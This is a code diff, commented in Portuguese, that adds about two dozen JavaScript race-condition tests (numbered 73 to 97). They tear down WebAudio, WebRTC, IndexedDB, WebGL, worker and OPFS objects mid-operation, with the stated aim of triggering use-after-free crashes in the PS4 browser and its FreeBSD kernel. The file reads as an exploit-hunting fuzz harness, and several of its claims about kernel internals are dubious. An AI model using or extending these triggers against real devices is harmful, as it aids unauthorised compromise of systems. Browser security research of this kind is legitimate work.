+        // O ScriptProcessorNode é a forma antiga do WebAudio de comunicar C++ com JS. Ele atravessa
+        // as threads ativamente através de um buffer ring nativo.
+        function runLegacyScriptProcessorTeardown() {
+            log("[FreeBSD/kthread] Iniciando Legacy ScriptProcessor Teardown...");
+            try {
+                let ctx = new (window.AudioContext || window.webkitAudioContext)();
+                
+                // Cria o nó obsoleto (frequentemente com bugs de sincronização de memória não corrigidos)
+                let processor = ctx.createScriptProcessor(4096, 1, 1);
+                let osc = ctx.createOscillator();
+                
+                osc.connect(processor);
+                processor.connect(ctx.destination);
+                osc.start();
+                
+                processor.onaudioprocess = function(e) {
+                    // Preenche o buffer de saída do kernel com ruído (Math pesado)
+                    let output = e.outputBuffer.getChannelData(0);
+                    for (let i = 0; i < output.length; i++) output[i] = Math.random();
+                    
+                    // Exatamente no meio do callback (quando a kthread aguarda o retorno do JS),
+                    // fechamos o contexto no nível do hardware ALSA/OSS.
+                    ctx.close().then(() => log("[FreeBSD/kthread] Contexto fechado de dentro da kthread."));
+                    processor.disconnect();
+                };
+                
+            } catch(e) {
+                log("[FreeBSD/kthread] Erro ou nó não suportado: " + e.message);
+            }
+        }
+
+        // --- 74. FileReader VFS Buffer Detach Race ---
+        // Alvo: Sincronização de I/O do FreeBSD com o Garbage Collector do WebKit.
+        // Um FileReader lê um arquivo nativo (vnode) e entrega um ArrayBuffer. Pegamos o buffer 
+        // recém-alocado e o arrancamos (detach) via IPC antes que a estrutura C++ o limpe.
+        function runFileReaderBufferDetachRace() {
+            log("[VFS/Mem] Iniciando FileReader Buffer Detach...");
+            
+            let blob = new Blob([new Uint8Array(1024 * 1024 * 10)]); // 10MB
+            let reader = new FileReader();
+            
+            let workerCode = `onmessage = function() { /* Void */ };`;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            
+            reader.onload = function(e) {
+                let buffer = e.target.result;
+                // Imediatamente tenta "roubar" a propriedade (ownership) da memória do buffer 
+                // que o C++ acabou de passar do kernel para a Userland, enviando-o para um processo morto.
+                w.postMessage(buffer, [buffer]);
+                w.terminate();
+                log("[VFS/Mem] Buffer de I/O desanexado durante evento de dispatch do C++.");
+            };
+            
+            reader.readAsArrayBuffer(blob);
+        }
+
+        // --- 75. XHR Network Socket VFS Abort Race ---
+        // Alvo: File system spooling (gravação em disco de downloads) e Sockets TCP.
+        // O XHR usando 'blob' salva payloads muito grandes no disco temporário do sistema operacional.
+        // Chamar abort() apaga o arquivo temporário (VFS) e corta a conexão TCP nativa simultaneamente.
+        function runXHRSocketVFSAbort() {
+            log("[Net/VFS] Iniciando XHR Socket/VFS Abort...");
+            
+            let xhr = new XMLHttpRequest();
+            // Acessa uma URL de mídia gigante (mock) que forçaria o spooling de disco no PS4
+            xhr.open('GET', 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4', true);
+            xhr.responseType = 'blob';
+            
+            xhr.onprogress = function(e) {
+                if (e.loaded > 1024 * 500) { // Assim que baixar 500KB...
+                    // O C++ já abriu um vnode temporário no FreeBSD para salvar o MP4.
+                    // Nós abortamos a conexão, obrigando o motor de rede a destruir o socket TCP
+                    // e o VFS a deletar o arquivo simultaneamente.
+                    xhr.abort();
+                    log("[Net/VFS] Download abortado. Socket e vnode temporário marcados para destruição.");
+                }
+            };
+            
+            xhr.send();
+            
+            // Garantia caso a requisição seja bloqueada por CORS, forçamos o C++ de qualquer maneira
+            setTimeout(() => { xhr.abort(); }, 100);
+        }
+// --- 76. WebRTC SCTP Massive Blob vnode Teardown ---
+        // Alvo: VFS (Virtual File System) e buffers de rede SCTP do kernel.
+        // Enviar um Blob gigante via DataChannel força o WebKit a ler o arquivo do disco 
+        // e passar os chunks diretamente para o driver de rede. Revogar e fechar durante esse trânsito.
+        function runWebRTCBlobSCTPTeardown() {
+            log("[Net/VFS] Iniciando SCTP Blob vnode Teardown...");
+            try {
+                let pc = new RTCPeerConnection({iceServers: []});
+                let dc = pc.createDataChannel("blob_race", {negotiated: true, id: 33});
+                
+                // Blob de 50MB (gera um vnode no FreeBSD)
+                let massiveBlob = new Blob([new Uint8Array(1024 * 1024 * 50).fill(0x42)]);
+                let url = URL.createObjectURL(massiveBlob);
+                
+                dc.onopen = () => {
+                    // C++ inicia a leitura do vnode e o repasse para o socket SCTP no kernel
+                    dc.send(massiveBlob);
+                    
+                    // Extermina a origem e o socket no meio do spooling de memória
+                    URL.revokeObjectURL(url);
+                    dc.close();
+                    pc.close();
+                    log("[Net/VFS] Blob revogado e socket SCTP fechado durante fragmentação de rede.");
+                };
+                
+                // Força o acionamento caso a porta não dispare onopen
+                try { dc.send(massiveBlob); URL.revokeObjectURL(url); dc.close(); pc.close(); } catch(e){}
+            } catch(e) {
+                log("[Net/VFS] Erro: " + e.message);
+            }
+        }
+
+        // --- 77. MediaRecorder Hardware Encoder Race ---
+        // Alvo: Drivers de hardware de compressão de vídeo (H.264).
+        // Capturar um canvas e jogar para o MediaRecorder liga o WebKit aos encoders físicos do console.
+        function runMediaRecorderEncoderRace() {
+            log("[Hardware/Driver] Iniciando MediaRecorder Encoder Race...");
+            if (typeof MediaRecorder === 'undefined') return log("[Hardware] MediaRecorder não suportado.");
+
+            let canvas = document.createElement('canvas');
+            let ctx = canvas.getContext('2d');
+            ctx.fillRect(0, 0, 100, 100);
+            
+            // 60 frames por segundo bombardeando o encoder
+            let stream = canvas.captureStream(60); 
+            let recorder = new MediaRecorder(stream);
+            
+            recorder.start(10); // Pede chunks a cada 10ms (stress extremo no muxer nativo)
+            
+            // Corrida letal: Destruir a track e parar o recorder enquanto o hardware
+            // tenta fazer o flush dos buffers de vídeo compactados para o C++.
+            setTimeout(() => {
+                stream.getTracks().forEach(t => t.stop());
+                recorder.stop();
+                recorder = null;
+                log("[Hardware/Driver] Encoder de hardware abortado durante muxing intenso.");
+            }, 50);
+        }
+
+        // --- 78. WebAudio Resampler SIMD Teardown ---
+        // Alvo: Rotinas de reamostragem (resampling) em SIMD/Assembly.
+        // Mudar a taxa de reprodução de um buffer gigante drasticamente força o C++ a 
+        // usar rotinas nativas da CPU para interpolar amostras.
+        function runAudioResamplerSIMDTeardown() {
+            log("[CPU/DSP] Iniciando Audio Resampler SIMD Teardown...");
+            try {
+                let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                let buffer = audioCtx.createBuffer(2, audioCtx.sampleRate * 5, audioCtx.sampleRate);
+                let source = audioCtx.createBufferSource();
+                
+                source.buffer = buffer;
+                source.connect(audioCtx.destination);
+                
+                // Manda o motor nativo tocar, mas altera a taxa de reprodução para um valor absurdo
+                source.playbackRate.value = 15.0; 
+                source.start(0);
+                
+                // No exato momento em que o Resampler do C++ entra no loop SIMD, arrancamos o buffer
+                source.disconnect();
+                source.buffer = null;
+                audioCtx.suspend();
+                
+                log("[CPU/DSP] Buffer removido durante interpolação de áudio SIMD.");
+            } catch(e) {
+                log("[CPU/DSP] Erro: " + e.message);
+            }
+        }
+
+        // --- 79. SQLite VFS Cursor Iteration Abort ---
+        // Alvo: Travas de arquivo (POSIX locks) e chamadas `fdatasync` do SQLite via IndexedDB.
+        function runIDBCursorVFSAbort() {
+            log("[VFS/SQLite] Iniciando Cursor Iteration Abort...");
+            
+            let req = indexedDB.open("ExploitDB_Cursor", 1);
+            req.onupgradeneeded = (e) => {
+                let db = e.target.result;
+                if(!db.objectStoreNames.contains("store")) db.createObjectStore("store");
+            };
+            
+            req.onsuccess = (e) => {
+                let db = e.target.result;
+                let tx = db.transaction("store", "readwrite");
+                let store = tx.objectStore("store");
+                
+                // Escreve alguns dados para garantir que a tabela existe
+                for(let i=0; i<100; i++) store.put(new ArrayBuffer(1024), i);
+                
+                // Inicia um cursor que varre o banco (syscalls de leitura sequencial no kernel)
+                let cursorReq = store.openCursor();
+                cursorReq.onsuccess = function(e) {
+                    let cursor = e.target.result;
+                    if (cursor) {
+                        // Aborta a transação exatamente quando o SQLite está avançando o ponteiro
+                        // do arquivo e mantendo a trava POSIX ativa no FreeBSD.
+                        tx.abort();
+                        db.close();
+                        log("[VFS/SQLite] Transação abortada durante iteração de cursor nativo.");
+                    }
+                };
+            };
+        }
+
+        // --- 80. ImageBitmap VRAM IPC Ping-Pong Death ---
+        // Alvo: Tabela de roteamento de IPC e VRAM (memória da placa de vídeo).
+        // Como o WebGL 1.0 é restrito, usamos o ImageBitmap (que aloca VRAM) e o jogamos 
+        // de um lado para o outro entre workers, fechando o canal de repente.
+        function runImageBitmapIPCPingPongDeath() {
+            log("[GPU/IPC] Iniciando VRAM Ping-Pong Death...");
+            
+            let canvas = document.createElement('canvas');
+            canvas.width = 256; canvas.height = 256;
+            
+            createImageBitmap(canvas).then(bitmap => {
+                let mc = new MessageChannel();
+                
+                let workerCode = `
+                    onmessage = function(e) {
+                        // Recebe a VRAM e imediatamente manda de volta
+                        let bmp = e.data.bmp;
+                        let port = e.ports[0];
+                        if(port && bmp) port.postMessage({bmp: bmp}, [bmp]);
+                    };
+                `;
+                let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+                
+                // Inicia o Ping-Pong
+                w.postMessage({bmp: bitmap}, [bitmap, mc.port2]);
+                
+                // Lê a volta na main thread
+                mc.port1.onmessage = function(e) {
+                    let returnedBmp = e.data.bmp;
+                    // Manda de volta mais uma vez
+                    w.postMessage({bmp: returnedBmp}, [returnedBmp]);
+                    
+                    // No meio do segundo voo, quebra as pontes
+                    mc.port1.close();
+                    w.terminate();
+                    
+                    // Tenta acessar o destrutor do objeto C++ que ficou flutuando no IPC
+                    try { returnedBmp.close(); } catch(err){}
+                    
+                    log("[GPU/IPC] Canal fechado e Worker morto com VRAM voando no IPC.");
+                };
+            });
+        }
+// --- 81. WebRTC SCTP Stream Reset Kernel Race ---
+        // Alvo: Pilha SCTP do FreeBSD. O fechamento abrupto de múltiplos canais 
+        // força o kernel a enviar sinais de "Stream Reset" simultâneos.
+        function runWebRTCSCTPStreamReset() {
+            log("[Net/SCTP] Iniciando SCTP Stream Reset Race...");
+            try {
+                let pc = new RTCPeerConnection({iceServers: []});
+                
+                // Cria múltiplos canais para forçar alocação de múltiplas streams SCTP nativas
+                let channels = [];
+                for(let i=0; i<5; i++) {
+                    channels.push(pc.createDataChannel("stream_" + i, {negotiated: true, id: i}));
+                }
+                
+                // Dispara dados para iniciar a alocação de mbufs no kernel
+                channels.forEach(dc => { try { dc.send(new ArrayBuffer(1024 * 500)); } catch(e){} });
+                
+                // Corrida: Fecha todos os canais e o PC no mesmo tick da CPU.
+                // O FreeBSD tentará redefinir (reset) todas as streams na mesma associação SCTP concorrentemente.
+                channels.forEach(dc => dc.close());
+                pc.close();
+                
+                log("[Net/SCTP] Canais SCTP fechados em massa durante alocação de mbufs.");
+            } catch(e) {
+                log("[Net/SCTP] Erro: " + e.message);
+            }
+        }
+
+        // --- 82. WebGL 1.0 Renderbuffer VRAM Teardown ---
+        // Alvo: Gerenciador de memória da GPU. Como o WebGL 1.0 não tem texturas 3D ou PBOs,
+        // usamos Renderbuffers gigantescos, que exigem alocação contígua e imediata de VRAM.
+        function runWebGL1RenderbufferVRAMDeath() {
+            log("[GPU/WebGL1] Iniciando Renderbuffer VRAM Teardown...");
+            let canvas = document.createElement('canvas');
+            let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return log("[GPU] WebGL 1.0 não suportado.");
+
+            let renderbuffer = gl.createRenderbuffer();
+            gl.bindRenderbuffer(gl.RENDERBUFFER, renderbuffer);
+            
+            // Pede ao driver da GPU para alocar um buffer de profundidade colossal (Gera stress no DMA)
+            // Usa MAX_RENDERBUFFER_SIZE ou um valor alto (ex: 4096x4096x16bits = 32MB de VRAM pura)
+            gl.renderbufferStorage(gl.RENDERBUFFER, gl.DEPTH_COMPONENT16, 4096, 4096);
+            
+            // Corrida letal: Deleta o objeto C++ antes que o driver de hardware confirme
+            // que a alocação física de memória na placa de vídeo foi concluída.
+            gl.deleteRenderbuffer(renderbuffer);
+            
+            // Tenta forçar a reciclagem da engine
+            let loseCtxExt = gl.getExtension('WEBGL_lose_context');
+            if (loseCtxExt) loseCtxExt.loseContext();
+
+            log("[GPU/WebGL1] Renderbuffer massivo alocado e deletado concorrentemente.");
+        }
+
+        // --- 83. Blob Slice Vnode Reference Teardown ---
+        // Alvo: Tabela de descritores de arquivo (vnodes) do VFS.
+        // Fatiar um Blob grande cria múltiplas referências virtuais (ponteiros C++) 
+        // para o mesmo arquivo físico mapeado no FreeBSD.
+        function runBlobSliceVnodePressure() {
+            log("[FreeBSD/VFS] Iniciando Blob Slice Vnode Teardown...");
+            
+            let dummyData = new Uint8Array(1024 * 1024 * 20).fill(0x77); // 20MB
+            let masterBlob = new Blob([dummyData]);
+            let masterUrl = URL.createObjectURL(masterBlob);
+            
+            let slices = [];
+            // Cria milhares de fatias lógicas apontando para o mesmo vnode
+            for(let i=0; i<5000; i++) {
+                slices.push(masterBlob.slice(i, i + 1024));
+            }
+            
+            // Manda um worker começar a ler uma fatia específica para invocar o descritor nativo
+            let workerCode = `onmessage = function(e) { let r = new FileReaderSync(); r.readAsArrayBuffer(e.data); };`;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            w.postMessage(slices[2500]);
+            
+            // Destrói a URL mestre (iniciando o teardown do vnode pai no FreeBSD)
+            // e aniquila as referências C++ fatiadas simultaneamente.
+            setTimeout(() => {
+                URL.revokeObjectURL(masterUrl);
+                slices = null;
+                w.terminate();
+                log("[FreeBSD/VFS] Vnode mestre revogado e milhares de fatias C++ órfãs geradas.");
+            }, 5);
+        }
+
+        // --- 84. WebCrypto Background Hash IPC Transfer Race ---
+        // Alvo: Threads de background C++ e motor de IPC.
+        // Passa um ArrayBuffer gigante para ser processado (SHA-256) na thread nativa do SO.
+        // Imediatamente transfere a ownership (propriedade) desse buffer para outro processo.
+        function runWebCryptoIPCBufferRace() {
+            log("[Crypto/IPC] Iniciando Background Hash Transfer Race...");
+            if (!window.crypto || !window.crypto.subtle) return log("[Crypto] WebCrypto não suportado.");
+
+            let buffer = new ArrayBuffer(1024 * 1024 * 100); // 100MB
+            
+            // Dispara o hash. Isso desce para o C++ e é enviado para uma pthread nativa.
+            crypto.subtle.digest("SHA-256", buffer).then(() => {
+                log("[Crypto/IPC] Hash concluído anomalia (Buffer deveria estar vazio).");
+            }).catch(e => log("[Crypto/IPC] Promessa rejeitada corretamente."));
+            
+            // Corrida: Transfere a memória física via IPC. O C++ tentará anular o buffer local.
+            // Se a pthread de Crypto do FreeBSD já estiver lendo essa memória, causamos um 
+            // Segmentation Fault nativo por Use-After-Free.
+            let mc = new MessageChannel();
+            mc.port1.postMessage(buffer, [buffer]);
+            
+            // Fecha a porta de fuga
+            mc.port1.close();
+            
+            log("[Crypto/IPC] Buffer de 100MB transferido no meio do cálculo SHA-256 nativo.");
+        }
+
+        // --- 85. WebAudio BiquadFilter DSP Teardown ---
+        // Alvo: Motor matemático de Processamento de Sinal Digital (DSP).
+        // Diferente do FFT, os filtros Biquad (lowpass, highpass) processam amostras 
+        // individualmente no domínio do tempo, usando intensamente os registradores da CPU.
+        function runWebAudioBiquadDSPTeardown() {
+            log("[CPU/DSP] Iniciando BiquadFilter DSP Teardown...");
+            try {
+                let ctx = new (window.AudioContext || window.webkitAudioContext)();
+                let filter = ctx.createBiquadFilter();
+                let osc = ctx.createOscillator();
+                
+                // Configuração agressiva de filtro para forçar cálculos flutuantes pesados
+                filter.type = "peaking";
+                filter.frequency.value = 1000;
+                filter.Q.value = 100; // Ressonância extrema
+                filter.gain.value = 25;
+                
+                osc.connect(filter);
+                filter.connect(ctx.destination);
+                osc.start(0);
+                
+                // Muta a frequência rapidamente para forçar o recálculo dos coeficientes C++ do filtro
+                filter.frequency.exponentialRampToValueAtTime(20000, ctx.currentTime + 0.1);
+                
+                // Interrompe o hardware exatamente durante a rampa exponencial de cálculo DSP
+                setTimeout(() => {
+                    filter.disconnect();
+                    osc.disconnect();
+                    ctx.suspend();
+                    log("[CPU/DSP] Filtro Biquad aniquilado durante recálculo de coeficientes nativos.");
+                }, 5);
+            } catch(e) {
+                log("[CPU/DSP] Erro: " + e.message);
+            }
+        }
+ // --- 86. WebSocket TCP Buffer Drop Race ---
+        // Alvo: O subsistema de rede do kernel FreeBSD (rotinas tcp_close e sofree).
+        // Forçar o WebKit a encher o buffer de envio do socket nativo e destruir o socket imediatamente.
+        function runWebSocketMassiveBufferTeardown() {
+            log("[Net/TCP] Iniciando WebSocket TCP Buffer Drop...");
+            try {
+                // Conecta a um IP de descarte rápido para forçar o handshake (opcional, falha rápida também serve)
+                let ws = new WebSocket("ws://127.0.0.1:12345");
+                let payload = new ArrayBuffer(1024 * 1024 * 50); // 50MB payload
+                
+                // Ignora o erro de conexão, o WebKit ainda aloca estruturas C++ subjacentes
+                ws.onerror = () => {}; 
+                
+                // Manda o C++ enfileirar 50MB no buffer de saída do socket do FreeBSD
+                try { ws.send(payload); } catch(e){}
+                
+                // Interrompe o socket. O kernel precisa lidar com uma fila gigante de dados 
+                // presa em um socket (File Descriptor) que está sendo fechado.
+                ws.close();
+                ws = null;
+                
+                log("[Net/TCP] 50MB enfileirados e socket WebSocket abortado simultaneamente.");
+            } catch(e) {
+                log("[Net/TCP] Erro: " + e.message);
+            }
+        }
+
+        // --- 87. SQLite VFS Transaction Rollback Death ---
+        // Alvo: Motor de Rollback do SQLite acionando o VFS do FreeBSD.
+        // Iniciar uma gravação gigantesca, forçar um erro de cota/restrição, e deletar a tabela 
+        // durante o rollback atômico do disco.
+        function runIDBTransactionRollbackRace() {
+            log("[VFS/SQLite] Iniciando Rollback Race...");
+            let req = indexedDB.open("ExploitDB_Rollback", 1);
+            
+            req.onupgradeneeded = (e) => {
+                let db = e.target.result;
+                if(!db.objectStoreNames.contains("rb_store")) db.createObjectStore("rb_store");
+            };
+            
+            req.onsuccess = (e) => {
+                let db = e.target.result;
+                let tx = db.transaction("rb_store", "readwrite");
+                let store = tx.objectStore("rb_store");
+                
+                // Dispara múltiplas inserções pesadas assincronamente
+                for(let i=0; i<50; i++) {
+                    store.put(new ArrayBuffer(1024 * 1024), "key_" + i); // 50MB totais
+                }
+                
+                // No meio das gravações em background C++, abortamos a transação,
+                // forçando o SQLite a ler os arquivos de "journal" para desfazer as gravações no disco.
+                tx.abort();
+                
+                // Fechamos a conexão com o banco enquanto o C++ lida com os vnodes de rollback do FreeBSD
+                db.close();
+                
+                log("[VFS/SQLite] Transação massiva abortada. Kernel processando VFS Rollback.");
+            };
+        }
+
+        // --- 88. WebGL 1.0 Mipmap CPU Generation Race ---
+        // Alvo: Processamento pesado de CPU para imagens (C++) e DMA da VRAM.
+        // generateMipmap exige que a CPU do PS4 calcule versões reduzidas de uma textura 
+        // antes de enviá-las para a placa de vídeo.
+        function runWebGL1MipmapGenerationDeath() {
+            log("[GPU/CPU] Iniciando Mipmap Generation Race...");
+            let canvas = document.createElement('canvas');
+            let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return log("[GPU] WebGL 1.0 não suportado.");
+
+            let tex = gl.createTexture();
+            gl.bindTexture(gl.TEXTURE_2D, tex);
+            
+            // Aloca uma textura base considerável (2048x2048)
+            let pixels = new Uint8Array(2048 * 2048 * 4).fill(255);
+            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 2048, 2048, 0, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
+            
+            // Força a CPU a calcular todas as sub-texturas matematicamente em background
+            gl.generateMipmap(gl.TEXTURE_2D);
+            
+            // Destrói a textura nativa no meio do cálculo de CPU / transferência DMA
+            gl.deleteTexture(tex);
+            
+            log("[GPU/CPU] Textura deletada durante o cálculo nativo de Mipmaps.");
+        }
+
+        // --- 89. MediaElement Audio Hardware Demuxer Race ---
+        // Alvo: Drivers de decodificação nativa do FreeBSD (MediaElement).
+        // Ligar uma tag <audio> ao WebAudio puxa os dados do driver do SO (demuxer nativo)
+        // para o pipeline de DSP do navegador.
+        function runMediaElementAudioSourceTeardown() {
+            log("[Hardware/Audio] Iniciando Demuxer Race...");
+            try {
+                let audio = new Audio();
+                // O WebKit tenta pré-carregar via VFS, ligando o decoder nativo
+                audio.src = 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4'; 
+                
+                let ctx = new (window.AudioContext || window.webkitAudioContext)();
+                let source = ctx.createMediaElementSource(audio);
+                source.connect(ctx.destination);
+                
+                audio.play().catch(()=>{}); // Força a inicialização do driver
+                
+                // Imediatamente desconecta o pipeline do DSP e destrói o elemento de mídia original
+                setTimeout(() => {
+                    source.disconnect();
+                    audio.removeAttribute('src');
+                    audio = null;
+                    ctx.suspend();
+                    log("[Hardware/Audio] Fonte de mídia nativa destruída enquanto alimentava o DSP.");
+                }, 5);
+                
+            } catch(e) {
+                log("[Hardware/Audio] Erro: " + e.message);
+            }
+        }
+
+        // --- 90. WebRTC MediaStreamTrack Native Stop Race ---
+        // Alvo: Gerenciamento de Stream de hardware em C++.
+        // Quando um track de vídeo falso é enviado pelo WebRTC, encoders H.264 em hardware podem ser acionados.
+        function runWebRTCTrackStopTeardown() {
+            log("[Hardware/Video] Iniciando Video Track Native Race...");
+            
+            let canvas = document.createElement('canvas');
+            canvas.getContext('2d').fillRect(0,0,10,10);
+            let stream = canvas.captureStream(60);
+            let track = stream.getVideoTracks()[0];
+            
+            try {
+                let pc = new RTCPeerConnection({iceServers: []});
+                pc.addTrack(track, stream);
+                
+                pc.createOffer().then(offer => {
+                    pc.setLocalDescription(offer);
+                    
+                    // O C++ preparou o encoder nativo para despachar frames.
+                    // Nós paramos a captura de hardware (stop) e fechamos o descritor de rede no mesmo milissegundo.
+                    track.stop();
+                    pc.close();
+                    
+                    log("[Hardware/Video] Track de hardware e Socket de rede mortos concorrentemente.");
+                });
+            } catch(e) {
+                log("[Hardware/Video] Erro: " + e.message);
+            }
+        }
+// --- 91. WSS TLS/SSL Handshake Kernel Teardown ---
+        // Alvo: A máquina de estado criptográfico nativa interagindo com os sockets do FreeBSD.
+        // O handshake TLS/SSL envolve trocas complexas de chaves no nível do C++ (BoringSSL/OpenSSL).
+        // Interromper o socket exatamente no meio da troca de certificados corrompe o contexto nativo.
+        function runWSSTLSHandshakeTeardown() {
+            log("[Net/Crypto] Iniciando WSS TLS Handshake Teardown...");
+            try {
+                // Tenta conectar via WSS (Seguro) a uma porta HTTPS comum
+                let wss = new WebSocket("wss://127.0.0.1:443");
+                
+                // O WebKit delega a abertura do socket TCP ao kernel e, assim que conecta,
+                // inicia a engine TLS no C++ para o ClientHello.
+                
+                // Corrida: Fechamos a conexão numa janela de tempo minúscula,
+                // forçando o C++ a desalocar a estrutura SSL enquanto o FreeBSD ainda
+                // está processando os pacotes TCP do handshake.
+                setTimeout(() => {
+                    wss.close();
+                    wss = null;
+                    log("[Net/Crypto] Socket WSS abortado durante engine state de TLS ClientHello.");
+                }, 2); // 2ms é geralmente o gap onde a engine criptográfica liga o motor
+            } catch(e) {
+                log("[Net/Crypto] Erro: " + e.message);
+            }
+        }
+
+        // --- 92. OPFS VFS opendir/readdir Iterator Race ---
+        // Alvo: O subsistema de listagem de diretórios do FreeBSD (syscalls opendir/readdir).
+        // Iterar sobre um diretório OPFS cria um ponteiro de estado nativo no VFS.
+        function runOPFSDirectoryIteratorRace() {
+            log("[FreeBSD/VFS] Iniciando opendir Iterator Race...");
+            if (!navigator.storage || !navigator.storage.getDirectory) return log("[VFS] OPFS não suportado.");
+
+            let workerCode = `
+                onmessage = async function() {
+                    try {
+                        let dir = await navigator.storage.getDirectory();
+                        // Cria arquivos fantasmas para popular a lista
+                        for(let i=0; i<100; i++) await dir.getFileHandle('f_'+i, {create: true});
+                        
+                        // Cria o iterador assíncrono (abre o diretório no nível do VFS)
+                        let iterator = dir.values();
+                        
+                        // Puxa o primeiro valor para forçar o cache de readdir no kernel
+                        iterator.next().then(res => {
+                            // A thread será exterminada neste exato momento de callback
+                        });
+                    } catch(err) {}
+                };
+            `;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            w.postMessage("start");
+            
+            // Aborta a thread enquanto o iterador do C++ mantém o ponteiro do diretório do FreeBSD aberto
+            setTimeout(() => {
+                w.terminate();
+                log("[FreeBSD/VFS] Worker exterminado enquanto o iterador de diretório lia o disco.");
+            }, 50);
+        }
+
+        // --- 93. WebRTC mDNS Network Resolver Death ---
+        // Alvo: O resolvedor de nomes de domínio nativo (DNS/mDNS threads) do SO.
+        // O WebRTC usa mDNS (.local) para ofuscar IPs locais. O WebKit envia essas strings
+        // para o resolvedor nativo do FreeBSD.
+        function runWebRTCmDNSResolverDeath() {
+            log("[Net/DNS] Iniciando mDNS Resolver Death...");
+            try {
+                let pc = new RTCPeerConnection({iceServers: []});
+                pc.createDataChannel("mdns_race");
+                
+                // Injetamos um candidato ICE falso que exige resolução mDNS pesada no SO
+                let fakeCandidate = new RTCIceCandidate({
+                    candidate: "candidate:1 1 UDP 2113937151 905dbfec-06fb-4009-8d76-e175d9e5f524.local 58495 typ host",
+                    sdpMid: "0",
+                    sdpMLineIndex: 0
+                });
+
+                pc.createOffer().then(offer => {
+                    pc.setLocalDescription(offer);
+                    
+                    // O motor C++ despacha a query .local para o daemon de rede do FreeBSD
+                    pc.addIceCandidate(fakeCandidate).catch(()=>{});
+                    
+                    // Instantaneamente fechamos a PeerConnection. 
+                    // Se o resolvedor do kernel retornar o IP para um objeto C++ que já foi destruído = UAF.
+                    pc.close();
+                    pc = null;
+                    
+                    log("[Net/DNS] PeerConnection destruída enquanto o kernel resolvia nome mDNS.");
+                });
+            } catch(e) {
+                log("[Net/DNS] Erro: " + e.message);
+            }
+        }
+
+        // --- 94. Iframe Gamepad HID Interrupt Teardown ---
+        // Alvo: Roteamento de interrupções de hardware (HID) no WebCore.
+        // O kernel do PS4 avisa o navegador sobre os inputs do controle. 
+        // Ligar o polling de HID dentro de um Iframe e destruí-lo testa a tabela de roteamento.
+        function runIframeHIDInterruptTeardown() {
+            log("[Hardware/HID] Iniciando Iframe HID Teardown...");
+            
+            let iframe = document.createElement('iframe');
+            document.body.appendChild(iframe);
+            
+            // Força o frame a acessar a API, o que registra o contexto atual
+            // na lista de ouvintes de interrupção de hardware do WebKit C++
+            let pads = iframe.contentWindow.navigator.getGamepads ? iframe.contentWindow.navigator.getGamepads() : null;
+            
+            if (pads) {
+                // Removemos o Iframe do DOM brutalmente.
+                // O WebKit precisa limpar esse contexto da lista de ouvintes de hardware.
+                // Se o usuário mexer no controle neste exato milissegundo, o kernel tentará
+                // entregar o evento para uma janela que já foi despachada para o Garbage Collector.
+                iframe.parentNode.removeChild(iframe);
+                iframe = null;
+                log("[Hardware/HID] Iframe removido. Tabela de roteamento de hardware do SO orfanada.");
+            } else {
+                log("[Hardware/HID] API de Gamepad não detectada no frame.");
+                iframe.parentNode.removeChild(iframe);
+            }
+        }
+
+        // --- 95. AudioWorklet Internal RingBuffer Death ---
+        // Alvo: O RingBuffer C++ customizado entre a Main Thread e a kthread de áudio.
+        // Diferente do MessagePort normal, a MessagePort do AudioWorklet usa uma fila de memória
+        // nativa especializada (lock-free ring buffer) para não atrasar a thread de tempo real.
+        function runAudioWorkletRingBufferOverflow() {
+            log("[FreeBSD/kthread] Iniciando AudioWorklet RingBuffer Death...");
+            try {
+                let ctx = new (window.AudioContext || window.webkitAudioContext)();
+                
+                let blob = new Blob([`
+                    class Exploit extends AudioWorkletProcessor {
+                        process() { return true; }
+                    }
+                    registerProcessor('exploit', Exploit);
+                `], {type: 'application/javascript'});
+                
+                ctx.audioWorklet.addModule(URL.createObjectURL(blob)).then(() => {
+                    let node = new AudioWorkletNode(ctx, 'exploit');
+                    
+                    // Payload gigante para travar o enfileiramento (enqueue) do ring buffer C++
+                    let massivePayload = new Float32Array(1024 * 1024 * 5); // 5MB de floats
+                    
+                    // Dispara a escrita atômica no buffer nativo
+                    node.port.postMessage(massivePayload);
+                    
+                    // Corta o contexto de áudio enquanto a cópia de memória ocorre entre
+                    // o motor V8 (JS) e a memória isolada da kthread do FreeBSD.
+                    ctx.close();
+                    node.disconnect();
+                    
+                    log("[FreeBSD/kthread] RingBuffer nativo corrompido via fechamento de contexto concorrente.");
+                }).catch(e => log("[FreeBSD/kthread] Erro no módulo: " + e.message));
+            } catch(e) {
+                log("[FreeBSD/kthread] Erro: " + e.message);
+            }
+        }
+ // --- 96. AudioContext decodeAudioData pthread Teardown ---
+        // Alvo: Pthread nativa dedicada de decodificação de mídia.
+        // O decodeAudioData não roda na thread principal nem na kthread de áudio, ele cria 
+        // uma pthread temporária no C++ para passar o buffer pelo codec de hardware/software do SO.
+        function runAudioDecodePthreadTeardown() {
+            log("[CPU/Codec] Iniciando Audio Decoder pthread Teardown...");
+            try {
+                let ctx = new (window.AudioContext || window.webkitAudioContext)();
+                
+                // ArrayBuffer contendo lixo que forçará o parser do codec a tentar ler o header
+                let fakeMediaBuffer = new ArrayBuffer(1024 * 1024 * 10); // 10MB
+                
+                // Dispara a decodificação na pthread em background
+                ctx.decodeAudioData(fakeMediaBuffer).catch(()=>{});
+                
+                // No exato milissegundo em que o codec C++ (geralmente FFMPEG ou nativo do FreeBSD)
+                // está lendo a memória para validar o formato, fechamos o contexto base.
+                ctx.close();
+                ctx = null;
+                
+                log("[CPU/Codec] Contexto destruído durante varredura nativa do Codec de áudio.");
+            } catch(e) {
+                log("[CPU/Codec] Erro: " + e.message);
+            }
+        }
+
+        // --- 97. Worker importScripts() Sync VFS Race ---
+        // Alvo: O Virtual File System (VFS) lidando com syscalls síncronas bloqueantes.
